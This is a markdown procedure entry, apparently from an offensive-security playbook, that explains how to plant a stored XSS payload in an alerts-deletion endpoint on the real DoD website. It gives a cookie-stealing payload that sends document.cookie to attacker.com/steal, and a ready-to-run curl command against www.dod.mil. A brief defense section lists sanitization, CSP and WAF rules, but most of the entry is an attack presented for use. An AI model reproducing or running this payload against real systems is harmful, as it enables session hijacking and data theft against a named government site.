---
id: proc-uuid-2
tags:
  - xss
  - injection
  - stored-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-xss-delete-alerts]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:12.578Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Inject Stored XSS into Delete Endpoint

## Summary

This procedure injects a malicious JavaScript payload into the DoD alerts deletion endpoint's ID parameter, exploiting lack of input sanitization to store the XSS for later execution.

## Description

The DoD website's /alerts/delete/id/ endpoint accepts user-supplied IDs via GET without sanitization, storing them server-side. When an error occurs (e.g., ID not owned by user), the ID is reflected unsanitized in an error dialog on pages like /alerts/ or /member/options. This allows arbitrary JavaScript execution in the victim's browser, enabling session hijacking or data theft.

## Requirements

1. Victim's browser on attacker.com with JavaScript enabled
2. Valid DoD site URL (e.g., https://www.dod.mil)
3. HTTP client like curl or browser fetch API

## Defense

Defensive measures and detection strategies:

- Input validation and sanitization of all user-supplied parameters
- Content Security Policy (CSP) to block inline scripts
- Web Application Firewall (WAF) rules for XSS payloads in URLs

## Objectives

1. Store malicious payload server-side without detection
2. Prepare for reflection in error contexts
3. Enable cross-site execution in victim session

## Instructions

### Step 1: Prepare Payload

**Context**: Craft an XSS payload that evades basic filters, e.g., using onerror event.

No command; define payload: `<img src=x onerror=alert('XSS')>` or advanced: `<img src=x onerror=document.location='http://attacker.com/steal?data='+document.cookie>`

> Expected: Valid URL-encoded payload.

### Step 2: Send Injection Request

**Context**: Issue GET request to store the payload.

**Command** ([[commands/inject-xss-delete-alerts]]):
```bash
curl -X GET "https://www.dod.mil/alerts/delete/id/1234<img src=x onerror=alert('XSS')>" -v
```

> This sends the request; check verbose output for 200/302 response indicating storage. In browser, use fetch() from attacker.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-delete-alerts]]

## Tools Used


## Tags

- [[xss]]
- [[injection]]

